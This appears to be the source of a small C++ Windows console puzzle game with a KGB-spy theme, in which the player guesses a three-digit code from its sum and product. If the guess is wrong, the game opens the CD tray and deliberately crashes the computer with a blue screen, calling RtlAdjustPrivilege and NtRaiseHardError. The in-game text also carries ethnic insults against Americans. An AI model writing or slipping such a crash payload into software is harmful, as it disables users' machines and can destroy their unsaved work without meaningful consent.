// RedLeakConsole.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <stdio.h>
#include <Windows.h>
using namespace std;

#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);


void PrintIntroduction()
{
	cout << "************************************************\n";
	cout << "*______            _  _                   _    *\n";
	cout << "*| ___ \\          | || |                 | |   *\n";
	cout << "*| |_/ /  ___   __| || |      ___   __ _ | | __*\n";
	cout << "*|    /  / _ \\ / _` || |     / _ \\ / _` || |/ /*\n";
	cout << "*| |\\ \\ |  __/| (_| || |____|  __/| (_| ||   < *\n";
	cout << "*\\_| \\_| \\___| \\__,_|\\_____/ \\___| \\__,_||_|\\_\\*\n";
	cout << "************************************************\n";


	cout << "The year is 1965, two great powers are figthing for supremacy of the dome.\n";
	cout << "On one side we have the proud and glorious motherland, also know as the URSS.\n";
	cout << "On the other side we have the illiterate, dirty and greedy american pigs.\n";
	cout << "Who wins this war will be the most powerfull and influential country in the world.\n";

}

void PrintKGBIntro()
{
	cout << "You are agent 13, a KGB spy secretly infiltrated in the CIA HQ.\n";
	cout << "You need to find the correct security codes to bypass the security systems and steal the secret CIA projects to send them to our motherland.\n";
	

}

void PlayGame()
{

	PrintKGBIntro();

	//declare the 3 number code
	const int CodeA = 4;
	const int CodeB = 3;
	const int CodeC = 2;

	//print CodeSum and CodeProduct to the terminal
	const int CodeSum = CodeA + CodeB + CodeC;
	const int CodeProduct = CodeA * CodeB * CodeC;

	//hints
	cout;
	cout << "There are 3 numbers in the code.\n";
	cout << "\nThe codes add-up to: " << CodeSum;
	cout << "\nThe codes multiply to give: " << CodeProduct << endl;
	cout << "To enter de code you must write each number with a space between them, like this: X X X.\n\n";

	SetConsoleTextAttribute(hConsole, 12);
	cout << "MAKING A MISTAKE WILL HAVE DIRE CONSEQUENCES!!!!\n";
	SetConsoleTextAttribute(hConsole, 15);
	cout << "\n Enter the correct code to continue:\n\n";

	int GuessA, GuessB, GuessC;
	cin >> GuessA >> GuessB >> GuessC;


	int GuessSum = GuessA + GuessB + GuessC;
	int GuessProduct = GuessA * GuessB * GuessC;

	//Check if player guess is correct
	if (GuessSum == CodeSum && GuessProduct == CodeProduct)
	{
		cout << "\nGood my comrade, you did a great job for the motherland!";
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,*%%%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,,,,,,,,,,,,/%%%%%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,%,,,,,,,,,%%%%%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,%%%%%%%,,,,,,,,#%%%%%%%%%%%%,,,,,,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,,,,,,,,*%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,%%%%,,,,,,,#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*%%%%%%%%%%%*,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,%%%%%%%%%%%,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,,,*%%%%%%,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,%%%,,,,,,,,,,,,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,%%%%%%%%%(,,,,,,,,,,,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;



		bool played = PlaySound(L"Motherland.wav", NULL, SND_SYNC);

		

	}

	else
	{
		
		SetConsoleTextAttribute(hConsole,12);
		for (int k = 1; k < 10; k++)
		{
			cout << "\nCyka blyat comrade, you entered the wrong code and now you are going to DIE!";
		}
		

		mciSendString(L"set cdaudio door open", NULL, NULL, NULL);
		//Sleep(5000);
		//SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
		////turn back on
		//SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
		//Sleep(3000);



		//BSOD
		BOOLEAN bl;
		unsigned long response;
		RtlAdjustPrivilege(19, true, false, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	}

}



int main()
{

	PrintIntroduction();

	PlayGame();

	return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
